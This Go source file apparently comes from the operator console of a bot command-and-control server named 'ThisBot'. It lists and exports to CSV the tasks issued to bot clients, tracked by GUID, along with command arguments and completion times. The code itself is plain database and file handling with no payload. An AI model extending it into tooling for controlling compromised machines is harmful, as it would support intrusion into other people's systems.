package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"encoding/csv"
	"fmt"
	"os"
	"time"
)

func export_tasks(ary []string) {
	sql := `select l.guid, c.name, t.args, c.description, t.status, t.created_at, t.completed_at ` +
		`from tasks as t join commands as c on t.command_id = c.id join clients as l on t.bot_id = l.id`
	rows, err := db1.QueryRows(common.Db, sql)
	if err != nil {
		fmt.Println("[❗] Error in exporting tasks")
		return
	}
	defer rows.Close()
	// Check if tasks exist
	if !rows.Next() {
		fmt.Println("[💀] No tasks to export")
		return
	}
	// Build tasks log name
	fmtTime := ""
	if len(ary) < 3 {
		timestamp := utils.GenerateUtcTimestamp()
		t := time.UnixMilli(timestamp)
		fmtTime = t.Format("2006_01_02_15_04_05")
		fmtTime += "_tasks.csv"
	} else {
		fmtTime = ary[2]
		if !utils.IsSameSuffix(ary[2], "csv") {
			fmtTime += "_tasks.csv"
		}
	}
	// Create tasks log file
	file, err := os.Create(fmtTime)
	if err != nil {
		fmt.Println("[💀] Error in exporting tasks")
		return
	}
	defer file.Close()

	// Write to csv file
	writer := csv.NewWriter(file)
	defer writer.Flush()
	// Write header
	err = writer.Write([]string{"GUID", "Command", "Arguments", "Description", "Status", "CreatedAt", "CompletedAt"})
	if err != nil {
		fmt.Println("[💀] Error in exporting tasks")
		return
	}

	task_guid := ""
	task_command_name := ""
	task_command_args := ""
	task_command_description := ""
	task_command_status := ""
	task_created_at := ""
	task_completed_at := ""

	for {
		if err = rows.Scan(&task_guid, &task_command_name, &task_command_args, &task_command_description,
			&task_command_status, &task_created_at, &task_completed_at); err != nil {
			if !rows.Next() {
				break
			}
			continue
		}

		record := []string{task_guid,
			task_command_name,
			task_command_args,
			task_command_description,
			task_command_status,
			task_created_at,
			task_completed_at}

		if err := writer.Write(record); err != nil {
			continue
		}

		if !rows.Next() {
			break
		}
	}
	fmt.Println("[✅] Export to " + fmtTime)
}

func list_tasks(ary []string) {
	sql := "select t.id, c.name, t.args, t.status, t.created_at, t.completed_at from tasks as t join commands as c on t.command_id = c.id"
	rows, err := db1.QueryRows(common.Db, sql)
	if err != nil {
		fmt.Println("[❗] Error in list tasks")
		return
	}
	defer rows.Close()
	if !rows.Next() {
		fmt.Println("[💀] No tasks found")
		return
	}
	id := 0
	command_name := ""
	command_args := ""
	command_status := ""
	command_created_at := ""
	command_completed_at := ""
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Println("🐾 🐾 🐾 Tasks list: ")
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	for {
		if err = rows.Scan(&id, &command_name, &command_args, &command_status, &command_created_at, &command_completed_at); err != nil {
			if !rows.Next() {
				break
			}
			continue
		}
		common.Mutex.Lock()
		fmt.Println("🔰 ID: ", id)
		fmt.Println("❓ Command: ", command_name)
		fmt.Println("👾 Args: ", command_args)
		fmt.Println("🕐 Created: ", command_created_at)
		fmt.Println("🌀 Completed: ", command_completed_at)
		fmt.Println("🐾 --------------------------------------------------- 🐾")
		common.Mutex.Unlock()
		if !rows.Next() {
			break
		}
	}
}
